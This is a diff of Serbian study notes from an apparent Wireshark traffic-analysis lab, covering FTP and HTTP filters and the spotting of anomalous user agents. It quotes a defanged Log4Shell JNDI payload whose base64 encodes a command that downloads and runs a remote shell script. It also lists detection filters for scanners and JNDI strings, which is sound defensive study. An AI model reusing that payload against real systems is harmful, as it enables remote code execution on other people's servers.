@@ -538,16 +538,140 @@ wireshark filteri:
 
 **koliko je pogresnih login-a**
 
-``
+ubacimo odgovarajuci fajl za ovu vezbu i primenimo filter  
 
+`ftp.response.code == 530`
 
+**kolika je velicina fajla kojoj pristupa ftp account**
+
+primenimo filter i u detlajima pod ftp > response arg vidimo velicinu  
+
+`ftp.response.code == 530``
+
+**protovnik je otpremio koji dokument na ftp server - ime datoteke**
+
+primenimo filteri i pronadjemo pod ftp ime fajla (komanda moze da bude i STOR)  
+
+`ftp.request.command == "RETR"`
  
+**napadac pokusava da dobije pristup flagovima da promeni permission uplode-ovanog fajla, koja je komanda? (na linuxu je chmod)**
+
+izvrsimo upit i u detaljima ftp vidimo komandu  
+
+`ftp contains "CHMOD"`
+
+## analiza HTTP 
+
+protokol koji jse koristi za klijent server arhitekturu: zahtev-ogovor  
+
+najcesci napadi preko http: phising, web napadi, izvlacenje podataka, komandovanje i kontrola c2 saobracaja   
+
+wireshark: 
+
+```
+http 
+http2 - verzija sa boljom bezbednosti i performansama, podrazumeva prenos bin podataka i multipleksiranje zahteva i odgovora 
+```
+
+```
+http.request.method == "GET"
+http.request.method == "POST"
+http.request
+```
+
+```
+http.response.code == 200 
+http.response.code == 401 
+http.response.code == 403 
+http.response.code == 404
+http.response.code == 405
+http.response.code == 503
+```
+
+> PODSETNIK: 
+> 200 OK: Request successful.
+> 301 Moved Permanently: Resource is moved to a new URL/path (permanently).
+> 302 Moved Temporarily: Resource is moved to a new URL/path (temporarily).
+> 400 Bad Request: Server didn't understand the request.
+> 401 Unauthorised: URL needs authorisation (login, etc.).
+> 403 Forbidden: No access to the requested URL. 
+> 404 Not Found: Server can't find the requested URL.
+> 405 Method Not Allowed: Used method is not suitable or blocked.
+> 408 Request Timeout:  Request look longer than server wait time.
+> 500 Internal Server Error: Request not completed, unexpected error.
+> 503 Service Unavailable: Request not completed server or service is down.
+
+``` 
+http.user_agent contains "nmap"  -identifikacija browsera i os-a za serversku aplikaciju 
+http.request.uri contains "admin"  -uri - trazeni resurs sa servera
+http.request.full_uri contains "admin"  -kompletne informacije u url-u 
+```
+
+```
+http.server contains "apache"  -naziv servisa 
+http.host contains "keyword"
+http.host == "keyword"
+http.connection == "Keep-Alive"   -status veze
+data-text-lines contains "keyword"  --informacije o veb obrascu 
+```
+
+`http.user_agent`
+`(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`
+
+```
+poznata java ranjivost. „jndi:ldap “ и „ Exploit.class “
+
+http.request.method == "POST"
+(ip contains "jndi") or ( ip contains "Exploit")
+(frame contains "jndi") or ( frame contains "Exploit")
+(http.user_agent contains "$") or (http.user_agent contains "==")
+```
 
 
+**istraziti user agente, koji je broj anomalnih user agent tipova**
 
+postavimo odg fajl u wireshark i primenimo filter. Kada primenimo filtert idemo na detalje http > user agent > desni klik apply as column da imamo u prikazu i user agenta.  
 
+Nisam skontao kako treba da prepoznam koji je anomalan user agent, verovatno kad vidim nesto sumnjivo u njemu, ali meni windows NT 6.4 nije sumnjiv npr, tako da ne znam ovo da resim i skontam
 
+`http.user_agent`
 
+Anomalni user agneti:  
+
+> Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10  -ovo je sumnjivo nzm zasto
+> Mozilla/5.0 (compatible; Nmap Scripting Engine; https[://]nmap[.]org/book/nse[.]html)  -skener portova 
+> Wfuzz/2.4   -alat za bruteforce 
+> sqlmap/1.4#stable (http[://]sqlmap[.]org)  -automatski sql injection
+> ${jndi:ldap[://]45[.]137[.]21[.]9[:]1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}  -logshell, daljinsko izvrsavanje 
+> Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+> curl/7.68.0	-CLI alat, često korišćen za testiranje i napade
+> python-requests/2.25.1	-Python skripta
+
+ovo vazi sve pod uslovom da napadaci ne sakrivaju alat koji koriste !! 
+
+**koji je broj paketa sa pravopisnom razlikom u user agent polju**
+
+primenimo filter i dodamo user agnet iz detalja kao kolonu... gledamo sta ima sumnjivo, mozila sa jednim L i kliknemo na nju i vidimo da ima 52 paketa ukupno 
+
+`http.user_agent`
+
+**lociraj log4j napad start fazu, koji je broj paketa (ne ukupan broj nego broj tog paketa koji otkrijemo)**
+
+koristimo drugi fajl za ovu vezbu  
+
+primenimo filter i onda u detaljima http user agent kopiramo i dekodujemo iz base 64. tu vidimo da se koristi komanda wget
+
+`(http.user_agent contains "$") or (http.user_agent contains "==")`
+
+ovde imamo srece i prvi paket po redu vidimo kad smo dekodovali base 64 user agenta da je koristio wget da preuzme nesto, znaci to nam je pocetak svega...  
+
+**koja je adresa iz base64 enkodovanog user agneta iz pocetne startne faze? Defang format.**  
+
+znaci istog user agenta iz prethodnog zadatka enkodujemo, vidimo onu wget komandu, iz nje uzmemo ip adresu i uradimo defang.  
+
+defang i enkodovanje radim na cyber chef, ali defang mogu i rucno, umesto . stavljam [.]   
+
+## analiza HTTPS  
 
 
 
